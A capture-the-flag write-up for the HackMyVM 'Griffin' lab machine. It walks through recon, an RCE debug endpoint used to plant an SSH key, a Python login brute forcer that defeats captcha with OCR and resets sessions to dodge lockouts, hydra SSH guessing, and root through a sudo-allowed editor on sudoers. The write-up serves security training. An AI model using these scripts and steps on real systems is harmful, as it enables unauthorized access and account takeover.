# Griffin

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.28:22
Open 10.0.2.28:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.28

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
8080/tcp open  http    syn-ack Werkzeug httpd 3.1.3 (Python 3.9.2)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
|_http-favicon: Unknown favicon MD5: DD9E535C7728FB79BFE3CAA24AA906B3
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (8080)

```bash
└─$ curl http://griffin.hmv:8080/
Yo, welcome to GriffinCorp, the coolest company in Quahog!
Peter Griffin’s got your back with top-notch service.
Don’t mess this up, or Lois is gonna be pissed! 
```

### Fuzzing

```bash
└─$ feroxbuster -u http://griffin.hmv:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403 --dont-scan js,css,png,jpeg,jpg,gif -n -W 27
200      GET        1l        6w       45c http://griffin.hmv:8080/info
```

```bash
└─$ curl http://griffin.hmv:8080/info -i
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.2
Date: Sat, 30 Aug 2025 16:00:54 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 45
Connection: close

System Info: Diagnostic token = AlphaToken123 
```

After curl-ing few more times the output changed, if iterated few more times there's actually 3 tokens...
```bash
└─$ for i in {1..16}; do curl http://griffin.hmv:8080/info -s; echo; done | sort | uniq -c
      5 System Info: Diagnostic token = AlphaToken123
      6 System Info: Diagnostic token = BetaToken123
      5 System Info: Diagnostic token = CyberCorpDebug123
```

I duplicated lines in wordlist for more hits and switched to gobuster since feroxbuster had some errors..
```bash
└─$ awk '{for(i=0;i<10;i++) print}' /usr/share/seclists/Discovery/Web-Content/common.txt > common.dup10.txt
└─$ gobuster dir -u http://griffin.hmv:8080/ -w common.dup10.txt --exclude-length 164
/debug                (Status: 403) [Size: 23]
/info                 (Status: 200) [Size: 49]
```

```bash
#!/bin/bash

for token in AlphaToken123 BetaToken123 CyberCorpDebug123; do
    for i in {1..32}; do
        resp=$(curl -s "http://griffin.hmv:8080/debug?token=$token")
        if [[ "$resp" == *"Lois is gonna be pissed!"* ]]; then
            continue
        fi
        echo "[$token] $resp"
    done
done | sort | uniq -c

#  10 [AlphaToken123] Invalid token
#  11 [BetaToken123] Invalid token
#  11 [CyberCorpDebug123] Missing run command
```

### RCE (lois)

After some manual fuzzing
```bash
└─$ curl 'http://griffin.hmv:8080/debug?token=CyberCorpDebug123&run=id'
uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
```

So SSH keys
```bash
└─$ curl 'http://griffin.hmv:8080/debug?token=CyberCorpDebug123&run=find+/home+-ls'
Command error:    523265      4 drwxr-xr-x   6 root     root         4096 Jun  8 23:43 /home
   527366      4 drwxr-xr-x   2 chris    chris        4096 Jun  8 23:43 /home/chris
   527368      4 -rw-r--r--   1 chris    chris         220 Apr 18  2019 /home/chris/.bash_logout
   527369      4 -rw-r--r--   1 chris    chris        3526 Apr 18  2019 /home/chris/.bashrc
   527408      4 -rw-r--r--   1 chris    chris         807 Apr 18  2019 /home/chris/.profile
   527370      4 drwxr-xr-x   2 meg      meg          4096 Jun  8 12:19 /home/meg
   527371      4 -rw-r--r--   1 meg      meg           220 Apr 18  2019 /home/meg/.bash_logout
   527372      4 -rw-r--r--   1 meg      meg          3526 Apr 18  2019 /home/meg/.bashrc
   527413      0 lrwxrwxrwx   1 root     root            9 Jun  8 12:19 /home/meg/.bash_history -> /dev/null
   527373      4 -rw-r--r--   1 meg      meg           807 Apr 18  2019 /home/meg/.profile
   527400      4 drwxr-xr-x   2 lois     lois         4096 Jun 10 05:42 /home/lois
   527401      4 -rw-r--r--   1 lois     lois          220 Apr 18  2019 /home/lois/.bash_logout
   527402      4 -rw-r--r--   1 lois     lois         3526 Apr 18  2019 /home/lois/.bashrc
   527412      0 lrwxrwxrwx   1 root     root            9 Jun  8 12:19 /home/lois/.bash_history -> /dev/null
   527367      4 -rwxrwxrwx   1 root     root           44 Jun  9 05:48 /home/lois/user.txt
   527403      4 -rw-r--r--   1 lois     lois          807 Apr 18  2019 /home/lois/.profile
   527404      4 drwxr-xr-x   2 peter    peter        4096 Jun  8 12:19 /home/peter
   527405      4 -rw-r--r--   1 peter    peter         220 Apr 18  2019 /home/peter/.bash_logout
   527406      4 -rw-r--r--   1 peter    peter        3526 Apr 18  2019 /home/peter/.bashrc
   527365      0 lrwxrwxrwx   1 root     root            9 Jun  8 12:19 /home/peter/.bash_history -> /dev/null
   527407      4 -rw-r--r--   1 peter    peter         807 Apr 18  2019 /home/peter/.profile
find: Failed to restore initial working directory: /root: Permission denied
```

## SSH (lois)

```bash
└─$ ssh-keygen -f id_rsa.lois -q -P x
└─$ cat id_rsa.lois.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINkjVDAZkLQ2YjXthP2uaOMJvBFTuputOUQ3qEWINWXF woyag@kraken

└─$ curl 'http://griffin.hmv:8080/debug?token=CyberCorpDebug123' -G --data-urlencode 'run=mkdir /home/lois/.ssh'
└─$ curl 'http://griffin.hmv:8080/debug?token=CyberCorpDebug123' -G --data-urlencode 'run=echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINkjVDAZkLQ2YjXthP2uaOMJvBFTuputOUQ3qEWINWXF woyag@kraken" > /home/lois/.ssh/authorized_keys'

└─$ ssh lois@griffin.hmv -i id_rsa.lois
lois@Griffin:~$ id
uid=1002(lois) gid=1002(lois) groups=1002(lois)
```

### User.txt

```bash
lois@Griffin:~$ cat user.txt
flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
```

## Privilege Escalation (meg)

```bash
lois@Griffin:~$ sudo -l
Matching Defaults entries for lois on Griffin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lois may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log
```

```bash
lois@Griffin:~$ sudo cat /root/startup.log | grep -v Accepted
[Beta Service] Listening on 127.0.0.1:29003...
 * Serving Flask app 'beta'
 * Debug mode: off
[Alpha Service] Listening on 127.0.0.1:29001...
 * Serving Flask app 'alpha'
 * Debug mode: off
[Service-C Service] Listening on 127.0.0.1:29002...
Privileges dropped to UID 1002, GID 1002
 * Serving Flask app 'phoenix'
 * Debug mode: off
CyberCorp Load Balancer Daemon started.
Listening on all interfaces (0.0.0.0):8080.
Backend servers: [29001, 29002, 29003]
--------------------------------------------------
```

We can probably ignore `2900?` ports, also 8080 
```bash
lois@Griffin:~$ ss -tunlp4
Netid      State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port
udp        UNCONN      0           0                      0.0.0.0:68                   0.0.0.0:*
tcp        LISTEN      0           128                  127.0.0.1:29001                0.0.0.0:*
tcp        LISTEN      0           128                  127.0.0.1:29002                0.0.0.0:*
tcp        LISTEN      0           128                  127.0.0.1:29003                0.0.0.0:*
tcp        LISTEN      0           5                      0.0.0.0:8080                 0.0.0.0:*
tcp        LISTEN      0           128                  127.0.0.1:80                   0.0.0.0:*
tcp        LISTEN      0           128                    0.0.0.0:22                   0.0.0.0:*
```

### HTTP (80)

There's an internal HTTP server
```bash
lois@Griffin:~$ curl 127.0.0.1 -s | grep title
    <title>Family Guy - The Griffins' Wild Ride</title>
```

Port forward
```bash
└─$ ssh lois@griffin.hmv -i id_rsa.lois -L 80:0:80
```

![writeup.png](/assets/pentest/hackmyvm/griffin/writeup.png)

First check `robots.txt`
```bash
└─$ curl 0/robots.txt -s | grep -v '^$'
User-agent: *
Disallow: /family
rockyou: world's best dictionary, hands down!
```

![writeup-1.png](/assets/pentest/hackmyvm/griffin/writeup-1.png)

Looks like we will have to bruteforce our way in... with captcha and max of 5 failed attempts.

So because we had `root` group in `8080` application I wanted to test if I could read source code or leak environment variables, but permission denied and empty env vars :(
```bash
└─$ curl 'http://griffin.hmv:8080/debug?token=CyberCorpDebug123' -G --data-urlencode 'run=for f in /proc/[0-9]*/cmdline; do pid=${f#/proc/}; pid=${pid%%/*}; cmd=$(tr "\000" " " < "$f"); [ -n "$cmd" ] && printf "[%s] %s\n" "$pid" "$cmd"; done 2>/dev/null'
...
[425] python3 /root/alpha.py
[426] python3 /root/beta.py
[427] python3 /root/phoenix.py
[428] python3 /root/load_balancer_daemon.py
...
└─$ curl 'http://griffin.hmv:8080/debug?token=CyberCorpDebug123' -G --data-urlencode 'run=cat /proc/425/cwd/alpha.py'
Command error: cat: /proc/425/cwd/alpha.py: Permission denied
```

```bash
└─$ curl 'http://griffin.hmv:8080/debug?token=CyberCorpDebug123' -G --data-urlencode 'run=cat /proc/*/environ 2>/dev/null' -so- | tr '\0' '\n' | sort | uniq
Command error: LANG=en_US.UTF-8
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus
HOME=/home/lois
HOME=/root
INVOCATION_ID=1941b609fa3d4c48a172b0c8cbd3963e
JOURNAL_STREAM=9:469567
LANG=en_US.UTF-8
LOGNAME=lois
LOGNAME=root
NOTIFY_SOCKET=/run/systemd/notify
PATH=/usr/bin:/bin
PATH=/usr/local/bin:/usr/bin:/bin:/usr/games
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/root
SHELL=/bin/bash
SHELL=/bin/sh
SHLVL=0
SSH_CLIENT=10.0.2.15 43132 22
SSH_CONNECTION=10.0.2.15 43132 10.0.2.28 22
SSH_TTY=/dev/pts/0
TERM=tmux-256color
USER=lois
_=/usr/bin/python3
WERKZEUG_SERVER_FD=3
XDG_RUNTIME_DIR=/run/user/1002
XDG_SESSION_CLASS=user
XDG_SESSION_ID=7
XDG_SESSION_TYPE=tty
```

After analyzing the webapp Attempt Count seems to be bullshit as it's tied to `PHPSESSID`, we can get this cookie on each new request so shouldn't be a problem. The real problem (in terms of speed) is going to be Captcha, luckily it's just small text so we will need to do some OCR, get value and submit.

`pytesseract` was a flop. I then tried `EasyOCR`, but downloading the massive PyTorch library and running it on my **VirtualBox VM** without a GPU made it painfully slow and barely usable. While exploring [GitHub OCR projects](https://github.com/topics/ocr?l=python), I found a Chinese OCR **[ddddocr](https://github.com/sml2h3/ddddocr)** that works almost instantly and achieves around **80–90% accuracy**.

```python
import sys
import logging
from argparse import ArgumentParser
from requests import Session
from ddddocr import DdddOcr

class URLs:
    BASE = 'http://localhost/family'
    LOGIN = f'{BASE}/index.php'
    CAPTCHA = f'{BASE}/captcha.php'

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger(__name__)


def solve_captcha(session: Session, ocr: DdddOcr) -> str:
    response = session.get(URLs.CAPTCHA)
    response.raise_for_status()
    return ocr.classification(response.content).strip().upper()

def login(ocr: DdddOcr, username: str, password: str) -> bool:
    session = Session()
    attempt_counter = 0
    while True:
        attempt_counter += 1 
        if attempt_counter >= 5: # Refresh Session
            session.close()
            session = Session()
            logger.warning("Clearing Session Cookies and Headers")
        
        captcha_code = solve_captcha(session, ocr)
        resp = session.post(
            URLs.LOGIN,
            data={'username': username, 'password': password, 'captcha': captcha_code},
            allow_redirects=False,
            proxies = {'http': 'http://127.0.0.1:8080'} # Debug
        )
        
        if 'ACCOUNT TEMPORARILY LOCKED!' in resp.text:
            logger.error('Account temporarily locked after multiple failed attempts.')
            sys.exit(1)
        elif 'Username does not exist' in resp.text:
            logger.error(f'Username "{username}" does not exist. Exiting.')
            sys.exit(1)
        elif 'Invalid security code' in resp.text:
            logger.warning(f'Captcha failed for password "{password}" with captcha "{captcha_code}". Retrying...')
            continue  # Retry
        elif resp.status_code == 302:
            logger.info(f'Successful login! Password: "{password}", Captcha: "{captcha_code}", auth_token={resp.cookies["auth_token"]}')
            return True
        else:
            logger.info(f'Login attempt failed for password "{password}" with captcha "{captcha_code}".')
            return False

def main(username: str, wordlist: str) -> None:
    ocr = DdddOcr()

    with open(wordlist, encoding='latin-1') as f:
        for password in f:
            password = password.strip()
            if not password:
                continue  # Skip empty lines

            success = login(ocr, username, password)
            if success:
                break
 

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('-u', '--username', help='Username to try')
    parser.add_argument('-w', '--wordlist', help='Passwords to try')
    
    args = parser.parse_args()
    main(args.username, args.wordlist)
```

```bash
└─$ py brute.py -u chris -w $rockyou
[02:09:52] ERROR: Username "chris" does not exist. Exiting.

└─$ py brute.py -u brian -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
...
[02:13:40] INFO: Successful login! Password: "savannah", Captcha: "RY7G", auth_token=9xyr8Ay3ohk8o97mHD8X4aAZf9BTkQZWc
```

![writeup-2.png](/assets/pentest/hackmyvm/griffin/writeup-2.png)

The page seems to be just static content, only thing that works is a form and answer is of course [meg](https://www.youtube.com/shorts/bKiodrQXlK0?feature=share)

I noticed some time after, but in code I wanted to print Session cookie however we got `auth_token` which is unusual.

1. [https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier) -> `9xyr8Ay3ohk8o97mHD8X4aAZf9BTkQZWc` -> Base58
2. [https://www.dcode.fr/base-58-cipher](https://www.dcode.fr/base-58-cipher) -> `bWVnOmxvdmVseWZhbWlseQ==` -> Base64
3. [https://www.dcode.fr/code-base-64](https://www.dcode.fr/code-base-64) -> `meg:lovelyfamily`

## Privilege Escalation (peter)

Running the `game.py` opens port 6666 which you connect to using netcat and get series of questions, I was doing it manually till stage3 but 3 second manually is impossible.
```bash
└─$ sshpass -p lovelyfamily ssh meg@griffin.hmv
meg@Griffin:~$ id
uid=1001(meg) gid=1001(meg) groups=1001(meg)

meg@Griffin:~$ sudo -l
Matching Defaults entries for meg on Griffin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User meg may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py
```

Solve:
```python
from socket import socket, AF_INET, SOCK_STREAM
import re
from hashlib import md5

HOST, PORT = 'griffin.hmv', 6666

def rot_custom(ciphertext, pattern):
    plaintext = []
    base = ord('a')
    for i, char in enumerate(ciphertext):
        if char.isalpha():
            shift = pattern[i % len(pattern)]
            decrypted_char = chr((ord(char) - base - shift) % 26 + base)
            plaintext.append(decrypted_char)
        else:
            plaintext.append(char)

    return ''.join(plaintext)

with socket(AF_INET, SOCK_STREAM) as io:
    io.connect((HOST, PORT))

    stage1 = io.recv(1024).decode().split('\n')[0]
    stage1answer = str(eval(re.search(r'Solve: (.*) =', stage1).group(1)))
    print(stage1.replace('?', stage1answer))
    io.send(stage1answer.encode())

    stage2, stage2hint = io.recv(1024).decode().split('\n')[:2]
    pattern = [int(digit) for digit in re.search(r'(\d+)', stage2hint).group(1)]
    stage2answer = rot_custom(re.search(r'message: (.*)', stage2).group(1), pattern)
    print(f'{stage2} -> {pattern} -> {stage2answer}')
    io.send(stage2answer.encode())

    stage3 = io.recv(1024).decode().split('\n')[0]
    print(stage3)
    number, timestamp = re.search(r'MD5\((\d+).*: (\d+)', stage3).groups()
    answer = md5((number+timestamp).encode()).hexdigest()
    io.send(answer.encode())
    
    flag = io.recv(1024).decode()
    print(flag)
```

```bash
Stage 1: Solve: (61 * 9) // 4 = 137
Stage 2: Decrypt this message: gmfh{kbljgmfh} -> [1, 1, 5] -> flag{fakeflag}
Stage 3: Compute MD5(217602 + UNIX timestamp: 1756624070).
Congratulations! Flag: HMV{Wow!VeryFuuuuuny!}
```

```bash
└─$ echo $'chris\npeter' > usernames.txt
└─$ echo $'HMV{Wow!VeryFuuuuuny!}\nWow!VeryFuuuuuny!\nVeryFuuuuuny!' > passwords.txt
└─$ hydra -L usernames.txt -P passwords.txt griffin.hmv ssh
[22][ssh] host: griffin.hmv   login: peter   password: Wow!VeryFuuuuuny!
# Ofc it had to be peter D:
```

## Privilege Escalation (root)

```bash
└─$ sshpass -p 'Wow!VeryFuuuuuny!' ssh peter@griffin.hmv
peter@Griffin:~$ id
uid=1003(peter) gid=1003(peter) groups=1003(peter)

peter@Griffin:~$ sudo -l
Matching Defaults entries for peter on Griffin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/mg
```

[mg - emacs-like text editor](https://linux.die.net/man/1/mg)

```bash
peter@Griffin:~$ sudo mg /etc/sudoers
# User privilege specification
root    ALL=(ALL:ALL) ALL
peter   ALL=(ALL:ALL) NOPASSWD:ALL # Add something like this

Press [Ctrl+x -> Ctrl+c] and [y] to save and quit 
```

```bash
peter@Griffin:~$ sudo su
root@Griffin:/home/peter# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@Griffin:/home/peter# cat /root/root.txt
flag{root-be93b7d7f0a30d5159c0460874e6e015}
```